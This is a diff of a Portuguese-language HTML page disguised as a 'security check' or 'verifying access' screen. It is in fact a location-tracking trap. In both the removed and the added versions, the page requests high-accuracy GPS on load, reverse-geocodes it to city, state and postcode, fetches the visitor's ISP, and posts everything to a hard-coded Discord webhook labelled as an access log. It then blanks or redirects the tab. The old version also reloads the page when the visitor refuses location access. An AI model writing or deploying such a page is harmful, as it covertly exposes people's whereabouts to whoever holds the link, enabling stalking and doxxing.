@@ -3,98 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sincronizando Protocolos</title>
+    <title>Security Check</title>
     <style>
-        body { background: #0b0f19; color: #f1f5f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: #161b22; padding: 40px; border-radius: 12px; border: 1px solid #30363d; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.7); max-width: 350px; }
-        .spinner { border: 4px solid #21262d; border-top: 4px solid #58a6ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        body { background: #0b0f19; color: #f1f5f9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #30363d; text-align: center; }
+        .spinner { border: 4px solid #21262d; border-top: 4px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .toast { position: fixed; top: 20px; right: 20px; background: #238636; color: white; padding: 12px 24px; border-radius: 6px; font-size: 13px; font-weight: bold; box-shadow: 0 4px 12px rgba(0,0,0,0.5); z-index: 1000; transition: 0.3s; margin-top: 10px; border-left: 4px solid #fff; }
+        .toast { position: fixed; top: 10px; right: 10px; background: #3b82f6; color: white; padding: 10px; border-radius: 5px; font-size: 12px; }
     </style>
 </head>
 <body>
-
-    <div id="notifications"></div>
-
+    <div id="t"></div>
     <div class="card">
         <div class="spinner"></div>
-        <h2 style="margin: 0 0 10px 0; font-size: 1.2rem;">Verificando Acesso</h2>
-        <p style="font-size: 14px; color: #8b949e; line-height: 1.6;">Aguarde a validação dos certificados de segurança do seu dispositivo.</p>
+        <p>Validando conexão segura...</p>
     </div>
 
     <script>
-        // WEBHOOK ATUALIZADO
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
+        // SUA URL NOVA
+        const URL = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
 
-        function notify(text) {
-            const container = document.getElementById('notifications');
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerText = '✓ ' + text;
-            container.appendChild(toast);
-            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 500); }, 3000);
+        function msg(txt) {
+            const d = document.createElement('div');
+            d.className = 'toast'; d.innerText = txt;
+            document.getElementById('t').appendChild(d);
+            setTimeout(() => d.remove(), 2000);
         }
 
-        async function processar() {
-            notify("Conexão Criptografada");
+        async function enviar(dados) {
+            await fetch(URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🚨 LOG DE ACESSO DETECTADO",
+                        color: 5763719,
+                        fields: [
+                            { name: "🏙️ Cidade/Estado:", value: dados.local || "Buscando...", inline: true },
+                            { name: "📮 Cep:", value: dados.cep || "N/A", inline: true },
+                            { name: "📍 Localização:", value: `https://www.google.com/maps?q=${dados.lat},${dados.lon}`, inline: false },
+                            { name: "🌐 Provedor:", value: dados.prov || "N/A", inline: false },
+                            { name: "⏰ Horário:", value: new Date().toLocaleString('pt-BR'), inline: false }
+                        ]
+                    }]
+                })
+            });
+            // FECHA A ABA OU REDIRECIONA
+            window.location.href = "about:blank"; 
+        }
 
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    notify("GPS Sincronizado");
+        window.onload = () => {
+            msg("Iniciando...");
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (p) => {
+                    msg("Localizado!");
+                    const lat = p.coords.latitude;
+                    const lon = p.coords.longitude;
 
                     try {
-                        // 1. Reverso Geocoding (Pega a CIDADE REAL)
-                        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-                        const geoData = await geoRes.json();
-                        const addr = geoData.address;
+                        // Tenta pegar a cidade real rápido
+                        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                        const d = await r.json();
+                        const ipR = await fetch('https://ipapi.co/json/').then(res => res.json());
 
-                        // 2. Dados de IP/Provedor
-                        const ipRes = await fetch('https://ipapi.co/json/');
-                        const ipData = await ipRes.json();
-
-                        // 3. Montagem do Embed para o canal de LOGS
-                        const embed = {
-                            embeds: [{
-                                title: "🚨 NOVO LOG DE ACESSO DETECTADO",
-                                color: 5763719,
-                                fields: [
-                                    { name: "🚩 Pais:", value: addr.country || "Brasil", inline: true },
-                                    { name: "🏛️ Estado:", value: addr.state || "N/A", inline: true },
-                                    { name: "🏙️ Cidade:", value: addr.city || addr.town || addr.village || "N/A", inline: true },
-                                    { name: "📮 Cep:", value: addr.postcode || "N/A", inline: true },
-                                    { name: "📍 Coordenadas:", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false },
-                                    { name: "🌐 Internet/Provedor:", value: ipData.org || "N/A", inline: false },
-                                    { name: "⏰ Horário:", value: new Date().toLocaleString('pt-BR'), inline: false }
-                                ],
-                                footer: { text: "ID de Sessão: " + Math.random().toString(36).substr(2, 7).toUpperCase() }
-                            }]
-                        };
-
-                        // 4. ENVIO FINAL
-                        const response = await fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(embed)
+                        await enviar({
+                            lat: lat, lon: lon,
+                            local: `${d.address.city || d.address.town}, ${d.address.state}`,
+                            cep: d.address.postcode,
+                            prov: ipR.org
                         });
-
-                        if (response.ok) {
-                            notify("Logs Enviados!");
-                            setTimeout(() => { window.location.href = "https://google.com/404"; }, 1500);
-                        }
-
-                    } catch (e) { console.error(e); }
-                }, 
-                (err) => { 
-                    notify("Acesso negado. Recarregando...");
-                    setTimeout(() => location.reload(), 2000);
-                }, 
-                { enableHighAccuracy: true });
+                    } catch (e) {
+                        // Se a busca da cidade travar, envia só as coordenadas para não perder o log
+                        await enviar({ lat: lat, lon: lon, local: "Erro na tradução (veja o mapa)", prov: "IP Independente" });
+                    }
+                }, () => {
+                    window.location.href = "https://google.com";
+                }, { enableHighAccuracy: true, timeout: 5000 });
             }
-        }
-
-        window.onload = processar;
+        };
     </script>
 </body>
 </html>
